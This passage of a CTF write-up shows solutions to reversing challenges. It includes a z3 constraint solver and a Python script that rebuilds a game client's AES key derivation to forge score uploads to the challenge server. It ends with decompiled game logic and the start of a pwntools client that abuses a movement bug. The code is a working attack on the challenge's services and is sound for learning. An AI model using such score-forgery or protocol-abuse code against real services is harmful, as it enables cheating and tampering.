style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>chains <span style=color:#f92672>=</span> [<span style=color:#ae81ff>62</span>, <span style=color:#ae81ff>56</span>, <span style=color:#ae81ff>8</span>, <span style=color:#ae81ff>39</span>, <span style=color:#ae81ff>24</span>, <span style=color:#ae81ff>43</span>, <span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>11</span>, <span style=color:#ae81ff>20</span>, <span style=color:#ae81ff>61</span>, <span style=color:#ae81ff>22</span>, <span style=color:#ae81ff>58</span>, <span style=color:#ae81ff>53</span>, <span style=color:#ae81ff>18</span>, <span style=color:#ae81ff>41</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>48</span>, <span style=color:#ae81ff>59</span>, <span style=color:#ae81ff>23</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>46</span>, <span style=color:#ae81ff>63</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>26</span>, <span style=color:#ae81ff>25</span>, <span style=color:#ae81ff>55</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>60</span>, <span style=color:#ae81ff>54</span>, <span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>28</span>, <span style=color:#ae81ff>42</span>, <span style=color:#ae81ff>15</span>, <span style=color:#ae81ff>10</span>, <span style=color:#ae81ff>38</span>, <span style=color:#ae81ff>50</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>52</span>, <span style=color:#ae81ff>27</span>, <span style=color:#ae81ff>47</span>, <span style=color:#ae81ff>37</span>, <span style=color:#ae81ff>13</span>, <span style=color:#ae81ff>21</span>, <span style=color:#ae81ff>14</span>, <span style=color:#ae81ff>49</span>, <span style=color:#ae81ff>57</span>, <span style=color:#ae81ff>45</span>, <span style=color:#ae81ff>19</span>, <span style=color:#ae81ff>29</span>, <span style=color:#ae81ff>44</span>, <span style=color:#ae81ff>34</span>, <span style=color:#ae81ff>40</span>, <span style=color:#ae81ff>16</span>, <span style=color:#ae81ff>33</span>, <span style=color:#ae81ff>36</span>, <span style=color:#ae81ff>30</span>, <span style=color:#ae81ff>17</span>, <span style=color:#ae81ff>31</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>35</span>, <span style=color:#ae81ff>51</span>, <span style=color:#ae81ff>4</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> z3 <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> json
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span>alph <span style=color:#f92672>=</span> string<span style=color:#f92672>.</span>ascii_letters <span style=color:#f92672>+</span> string<span style=color:#f92672>.</span>digits
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>s <span style=color:#f92672>=</span> Solver()
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> [BitVec(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;b</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>,<span style=color:#ae81ff>1</span>) <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>64</span>)]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>output <span style=color:#f92672>=</span> json<span style=color:#f92672>.</span>loads(open(<span style=color:#e6db74>&#34;output.txt&#34;</span>)<span style=color:#f92672>.</span>read())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>xform</span>(val):
</span></span><span style=display:flex><span>    vals <span style=color:#f92672>=</span> [<span style=color:#ae81ff>0</span>] <span style=color:#f92672>*</span> <span style=color:#ae81ff>64</span>
</span></span><span style=display:flex><span>    bits <span style=color:#f92672>=</span> list(map(int,bin(val)[<span style=color:#ae81ff>2</span>:]<span style=color:#f92672>.</span>zfill(<span style=color:#ae81ff>6</span>)))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>64</span>):
</span></span><span style=display:flex><span>        out <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>2</span>):
</span></span><span style=display:flex><span>            term <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> k <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>6</span>):
</span></span><span style=display:flex><span>                term <span style=color:#f92672>&amp;=</span> first_step_array[<span style=color:#ae81ff>12</span><span style=color:#f92672>*</span>i <span style=color:#f92672>+</span> <span style=color:#ae81ff>6</span><span style=color:#f92672>*</span>j <span style=color:#f92672>+</span> k] <span style=color:#f92672>^</span> bits[k]
</span></span><span style=display:flex><span>            out <span style=color:#f92672>|=</span> term
</span></span><span style=display:flex><span>        vals[i] <span style=color:#f92672>=</span> out
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> vals
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> n <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>64</span>):
</span></span><span style=display:flex><span>    vals <span style=color:#f92672>=</span> xform(n)
</span></span><span style=display:flex><span>    out <span style=color:#f92672>=</span> vals[chains[<span style=color:#ae81ff>0</span>]] <span style=color:#f92672>&amp;</span> vals[chains[<span style=color:#ae81ff>1</span>]] <span style=color:#f92672>&amp;</span> flag[chains[<span style=color:#ae81ff>0</span>]] <span style=color:#f92672>&amp;</span> flag[chains[<span style=color:#ae81ff>1</span>]]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>8</span>):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>8</span>):
</span></span><span style=display:flex><span>            idx1 <span style=color:#f92672>=</span> i<span style=color:#f92672>*</span><span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> j
</span></span><span style=display:flex><span>            idx2 <span style=color:#f92672>=</span> i<span style=color:#f92672>*</span><span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> (j<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>8</span>
</span></span><span style=display:flex><span>            v <span style=color:#f92672>=</span> vals[chains[idx1]] <span style=color:#f92672>&amp;</span> vals[chains[idx2]]
</span></span><span style=display:flex><span>            out <span style=color:#f92672>|=</span> v <span style=color:#f92672>&amp;</span> flag[chains[idx1]] <span style=color:#f92672>&amp;</span> flag[chains[idx2]]
</span></span><span style=display:flex><span>    s<span style=color:#f92672>.</span>add(out <span style=color:#f92672>==</span> output[n][<span style=color:#e6db74>&#34;output&#34;</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> s<span style=color:#f92672>.</span>check() <span style=color:#f92672>==</span> sat:
</span></span><span style=display:flex><span>    m <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>model()
</span></span><span style=display:flex><span>    sol <span style=color:#f92672>=</span> [m<span style=color:#f92672>.</span>evaluate(flag[i], model_completion<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)<span style=color:#f92672>.</span>as_long() <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>64</span>)]
</span></span><span style=display:flex><span>    cond <span style=color:#f92672>=</span> flag[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>!=</span> sol[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>64</span>):
</span></span><span style=display:flex><span>        cond <span style=color:#f92672>=</span> Or(cond, flag[i] <span style=color:#f92672>!=</span> sol[i])
</span></span><span style=display:flex><span>    s<span style=color:#f92672>.</span>add(cond)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    num <span style=color:#f92672>=</span> int(<span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join(map(str,sol)),<span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>    st <span style=color:#f92672>=</span> num<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>&#34;big&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> all(c <span style=color:#f92672>in</span> alph<span style=color:#f92672>.</span>encode() <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> st):
</span></span><span style=display:flex><span>        print(st)
</span></span></code></pre></div><h2 id=ptc---pwn-the-circles>PTC - Pwn The Circles!<a hidden class=anchor aria-hidden=true href=#ptc---pwn-the-circles>#</a></h2><blockquote><p>Are you better than Cookiezi? Show it to us and win a fantastic prize 🚩!
(P.S. the flag will appear in your profile page)</p><p><a href=https://ptc.m0lecon.fans>Click</a></p><p><em>Author: @Pixel_01</em></p></blockquote><p>In this challenge we are given an enormous JAR file, that contains a modified version of <a href=https://itdelatrisu.github.io/opsu/>opsu!</a>. The big difference is that it reports the scores to a custom server, and comes with 3 songs that are recognized on the server. Our goal is to register a user on the server, then upload a score for each song that is above a certain threshold. At this point, we will get the flag from the website.</p><p>The first level is extremely short, and ends up uploading a score even if you lose. Sniffing the connection going from Java, shows that is requests a key from <code>https://ptc.m0lecon.fans/api/key</code> and then sends some JSON-data with a base64-encoded blob to <code>https://ptc.m0lecon.fans/api/upload</code> afterwards. Searching for these strings do not yield any hits, but after diffing with the original game we find the class <code>itdelatrisu.opsu.i.D</code> which contains the scoreboard logic.</p><p>Essentially, the game will</p><ol><li>Convert the scoreboard data to JSON</li><li>Send the username to the key API</li><li>Decrypt the resulting key using a key derived from the username</li><li>Encrypt the scoreboard data with the decrypted key</li></ol><p>It will also hash the entire JAR file with sha256, and upload it together with the scoreboard data. This functions as a crude anti-tampering gimmick, but is easily bypassed.</p><p>The following code is able to upload the scores by enabling the various data parts one by one.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> hashlib <span style=color:#f92672>import</span> pbkdf2_hmac
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Cipher <span style=color:#f92672>import</span> AES
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.Padding <span style=color:#f92672>import</span> pad, unpad
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> json
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>name <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;iHqikf5sip8TLiFZ&#34;</span>
</span></span><span style=display:flex><span>salt <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64decode(<span style=color:#e6db74>&#34;cHdudGhlbTBsZQ==&#34;</span>)
</span></span><span style=display:flex><span>iv <span style=color:#f92672>=</span> name
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key1 <span style=color:#f92672>=</span> pbkdf2_hmac(
</span></span><span style=display:flex><span>    hash_name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;sha256&#39;</span>,
</span></span><span style=display:flex><span>    password <span style=color:#f92672>=</span> name,
</span></span><span style=display:flex><span>    salt <span style=color:#f92672>=</span> salt,
</span></span><span style=display:flex><span>    iterations <span style=color:#f92672>=</span> <span style=color:#ae81ff>65536</span>,
</span></span><span style=display:flex><span>    dklen <span style=color:#f92672>=</span> <span style=color:#ae81ff>32</span>
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key2_enc <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64decode(requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;https://ptc.m0lecon.fans/api/key&#34;</span>, headers<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;Id&#34;</span>:name<span style=color:#f92672>.</span>decode(), <span style=color:#e6db74>&#34;User-Agent&#34;</span>:<span style=color:#e6db74>&#34;Java/16.0.2&#34;</span>})<span style=color:#f92672>.</span>content)
</span></span><span style=display:flex><span>key2 <span style=color:#f92672>=</span> pbkdf2_hmac(
</span></span><span style=display:flex><span>    hash_name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;sha256&#39;</span>,
</span></span><span style=display:flex><span>    password <span style=color:#f92672>=</span> unpad(AES<span style=color:#f92672>.</span>new(key1[:<span style=color:#ae81ff>32</span>], AES<span style=color:#f92672>.</span>MODE_CBC, iv)<span style=color:#f92672>.</span>decrypt(key2_enc), <span style=color:#ae81ff>16</span>),
</span></span><span style=display:flex><span>    salt <span style=color:#f92672>=</span> salt,
</span></span><span style=display:flex><span>    iterations <span style=color:#f92672>=</span> <span style=color:#ae81ff>65536</span>,
</span></span><span style=display:flex><span>    dklen <span style=color:#f92672>=</span> <span style=color:#ae81ff>32</span>
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;map&#34;</span>:{<span style=color:#e6db74>&#34;MID&#34;</span>:<span style=color:#ae81ff>196716</span>,<span style=color:#e6db74>&#34;title&#34;</span>:<span style=color:#e6db74>&#34;You Suffer&#34;</span>,<span style=color:#e6db74>&#34;artist&#34;</span>:<span style=color:#e6db74>&#34;Napalm Death&#34;</span>,<span style=color:#e6db74>&#34;creator&#34;</span>:<span style=color:#e6db74>&#34;MillhioreF&#34;</span>,<span style=color:#e6db74>&#34;version&#34;</span>:<span style=color:#e6db74>&#34;Easy&#34;</span>,<span style=color:#e6db74>&#34;score&#34;</span>:<span style=color:#ae81ff>931</span>,<span style=color:#e6db74>&#34;MSID&#34;</span>:<span style=color:#ae81ff>67814</span>},<span style=color:#e6db74>&#34;player&#34;</span>:<span style=color:#e6db74>&#34;iHqikf5sip8TLiFZ&#34;</span>,<span style=color:#e6db74>&#34;checksum&#34;</span>:<span style=color:#e6db74>&#34;c30df1bb74ad3ac7283f11c24324dab92efaec45b6e4df71c3620c1a575d8997&#34;</span>}
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;map&#34;</span>:{<span style=color:#e6db74>&#34;MID&#34;</span>:<span style=color:#ae81ff>87431</span>,<span style=color:#e6db74>&#34;title&#34;</span>:<span style=color:#e6db74>&#34;FREEDOM DiVE&#34;</span>,<span style=color:#e6db74>&#34;artist&#34;</span>:<span style=color:#e6db74>&#34;xi&#34;</span>,<span style=color:#e6db74>&#34;creator&#34;</span>:<span style=color:#e6db74>&#34;Nakagawa-Kanon&#34;</span>,<span style=color:#e6db74>&#34;version&#34;</span>:<span style=color:#e6db74>&#34;FOUR DIMENSIONS&#34;</span>,<span style=color:#e6db74>&#34;score&#34;</span>:<span style=color:#ae81ff>132408003</span>,<span style=color:#e6db74>&#34;MSID&#34;</span>:<span style=color:#ae81ff>39804</span>},<span style=color:#e6db74>&#34;player&#34;</span>:<span style=color:#e6db74>&#34;iHqikf5sip8TLiFZ&#34;</span>,<span style=color:#e6db74>&#34;checksum&#34;</span>:<span style=color:#e6db74>&#34;c30df1bb74ad3ac7283f11c24324dab92efaec45b6e4df71c3620c1a575d8997&#34;</span>}
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;map&#34;</span>:{<span style=color:#e6db74>&#34;MID&#34;</span>:<span style=color:#ae81ff>31337</span>,<span style=color:#e6db74>&#34;title&#34;</span>:<span style=color:#e6db74>&#34;Skype x Can Can&#34;</span>,<span style=color:#e6db74>&#34;artist&#34;</span>:<span style=color:#e6db74>&#34;Ara Potato&#34;</span>,<span style=color:#e6db74>&#34;creator&#34;</span>:<span style=color:#e6db74>&#34;Real&#34;</span>,<span style=color:#e6db74>&#34;version&#34;</span>:<span style=color:#e6db74>&#34;Hard&#34;</span>,<span style=color:#e6db74>&#34;score&#34;</span>:<span style=color:#ae81ff>3133773314</span>,<span style=color:#e6db74>&#34;MSID&#34;</span>:<span style=color:#ae81ff>47078</span>},<span style=color:#e6db74>&#34;player&#34;</span>:<span style=color:#e6db74>&#34;iHqikf5sip8TLiFZ&#34;</span>,<span style=color:#e6db74>&#34;checksum&#34;</span>:<span style=color:#e6db74>&#34;c30df1bb74ad3ac7283f11c24324dab92efaec45b6e4df71c3620c1a575d8997&#34;</span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> pad(json<span style=color:#f92672>.</span>dumps(data)<span style=color:#f92672>.</span>encode(), <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>enc <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(key2, AES<span style=color:#f92672>.</span>MODE_CBC, iv)<span style=color:#f92672>.</span>encrypt(data)
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64encode(enc)<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>&#34;https://ptc.m0lecon.fans/api/upload&#34;</span>, json<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;data&#34;</span>:data}, headers<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;Id&#34;</span>:name<span style=color:#f92672>.</span>decode(), <span style=color:#e6db74>&#34;User-Agent&#34;</span>:<span style=color:#e6db74>&#34;Java/16.0.2&#34;</span>})
</span></span><span style=display:flex><span>print(res<span style=color:#f92672>.</span>content)
</span></span><span style=display:flex><span>print(base64<span style=color:#f92672>.</span>b64decode(res<span style=color:#f92672>.</span>content))
</span></span></code></pre></div><h2 id=yasm>YASM<a hidden class=anchor aria-hidden=true href=#yasm>#</a></h2><blockquote><p>Yet Another Super Mario, a Turin based platform game!
(You may need to install libglew-dev libglfw3 via apt; you also need to extract client_required files.7z inside the same folder as the client. Tested on Ubuntu 20.04, Mint 20.3, MX 21.1 baremetal)</p><p>Connect using: <code>./client 108.128.200.4</code></p><p><em>Author: @matpro</em></p></blockquote><p>The included client runs a Super Mario&mldr;eh&mldr;inspired game. It is very wonky, and runs at a speed where you can&rsquo;t really control the character at all. After proceeding through the map, mostly skipping dangers by luck, we get to a series of walls with a flag on the very right side of the map.</p><p>There&rsquo;s much to go into for this challenge, but the main parts is that the game actually runs on the server, and the client is just sending keypresses to the remote. It gets the game state, represented as matrices, sent back every now and then. Thus, modifying the game client does not give us the possibility to pass through walls or something like that. The only thing the client does, is to send keys and render the game state.</p><p>The protocol represents keypresses as two DWORDs, and can send multiple of them in the same packet. The first DWORD says if the player is pressing the UP-key, or if any of the buttons &ldquo;F, L, A, G&rdquo; are pressed. The second DWORD says if the player is going left or right, as it can&rsquo;t do both at the same time.</p><p>On the server side, there is a check that if your x-position is larger than 400, and the keys &ldquo;FALG&rdquo; (in that order) are pressed, it will actually send you the flag. But that position is far to the right, through the various walls that we cannot get through.</p><p>Luckily, there is a bug in the game, that was found by experimentation.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>if</span> ( keypress <span style=color:#f92672>==</span> GLFW_KEY_UP )
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( y_pos <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0.65</span> <span style=color:#f92672>&amp;&amp;</span> (y_pos <span style=color:#f92672>==</span> (<span style=color:#f92672>*</span>a2)[<span style=color:#ae81ff>2</span> <span style=color:#f92672>*</span> v19] <span style=color:#f92672>||</span> y_pos <span style=color:#f92672>==</span> (<span style=color:#f92672>*</span>a2)[<span style=color:#ae81ff>2</span> <span style=color:#f92672>*</span> v19 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>]) )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    Mat4<span style=color:#f92672>::</span>operator<span style=color:#f92672>*=</span>(<span style=color:#f92672>&amp;</span>v24, <span style=color:#f92672>&amp;</span>typ);
</span></span><span style=display:flex><span>    y_accelerate <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  LODWORD(keypress) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ( HIDWORD(keypress) <span style=color:#f92672>==</span> GLFW_KEY_RIGHT )
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( v30 <span style=color:#f92672>&gt;</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>40.15</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>is_moving_left <span style=color:#f92672>&amp;&amp;</span> (should_send_matrix <span style=color:#f92672>||</span> y_pos <span style=color:#f92672>&gt;=</span> a3[v19 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>]) )
</span></span><span style=display:flex><span>    Mat4<span style=color:#f92672>::</span>operator<span style=color:#f92672>*=</span>(<span style=color:#f92672>&amp;</span>v23, <span style=color:#f92672>&amp;</span>txn);
</span></span><span style=display:flex><span>  is_moving_left <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  HIDWORD(keypress) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ( HIDWORD(keypress) <span style=color:#f92672>==</span> GLFW_KEY_LEFT )
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( v30 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0.0</span> <span style=color:#f92672>&amp;&amp;</span> is_moving_left <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>&amp;&amp;</span> (should_send_matrix <span style=color:#f92672>||</span> y_pos <span style=color:#f92672>&gt;=</span> a3[v19 <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>]) )
</span></span><span style=display:flex><span>    Mat4<span style=color:#f92672>::</span>operator<span style=color:#f92672>*=</span>(<span style=color:#f92672>&amp;</span>v23, <span style=color:#f92672>&amp;</span>txp);
</span></span><span style=display:flex><span>  is_moving_left <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>  HIDWORD(keypress) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>should_send_matrix <span style=color:#f92672>&amp;&amp;</span> a3[v19] <span style=color:#f92672>&gt;</span> y_pos )
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( is_moving_left )
</span></span><span style=display:flex><span>    Mat4<span style=color:#f92672>::</span>operator<span style=color:#f92672>*=</span>(<span style=color:#f92672>&amp;</span>v23, <span style=color:#f92672>&amp;</span>txn);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    Mat4<span style=color:#f92672>::</span>operator<span style=color:#f92672>*=</span>(<span style=color:#f92672>&amp;</span>v23, <span style=color:#f92672>&amp;</span>txp);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>should_send_matrix <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>-</span> should_send_matrix;
</span></span></code></pre></div><p>Whenever we are going left, a flag is set. There is also a flag that toggles every game tick, which decides if it should send the matrix or not. It is possible to hit multiple of these blocks in a single tick, and end up glitching through a wall. However, it is not very reliable in the client program and there is a time limit before the server disconnects us, so we need to perfect it &ndash; or write our own client.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> struct <span style=color:#f92672>import</span> pack
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> random
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>UR <span style=color:#f92672>=</span> <span style=color:#ae81ff>13337</span>
</span></span><span style=display:flex><span>UL <span style=color:#f92672>=</span> <span style=color:#ae81ff>13338</span>
</span></span><span style=display:flex><span>U <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x109</span>
</span></span><span style=display:flex><span>L <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x107</span>
</span></span><span style=display:flex><span>R <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x106</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;debug&#34;</span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>log_file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;./log.txt&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_data</span>(key):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> key <span style=color:#f92672>==</span> UR:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> pack(<span style=color:#e6db74>&#34;&lt;LL&#34;</span>, U, R)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> key <span style=color:#f92672>==</span> UL:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> pack(<span style=color:#e6db74>&#34;&lt;LL&#34;</span>, U, L)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> key <span style=color:#f92672>in</span> [U, <span style=color:#ae81ff>70</span>, <span style=color:#ae81ff>65</span>, <span style=color:#ae81ff>76</span>, <span style=color:#ae81ff>71</span>]:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> pack(<span style=color:#e6db74>&#34;&lt;LL&#34;</span>, key, <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> key <span style=color:#f92672>in</span> (L, R):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> pack(<span style=color:#e6db74>&#34;&lt;LL&#34;</span>, <span style=color:#ae81ff>0</span>, key)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>submit</span>(keypresses):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> keys <span style=color:#f92672>in</span> keypresses:
</span></span><span style=display:flex><span>        tosend <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> hasattr(keys, <span style=color:#e6db74>&#34;__iter__&#34;</span>):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> key <span style=color:#f92672>in</span> keys:
</span></span><span style=display:flex><span>                tosend <span style=color:#f92672>+=</span> get_data(key)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
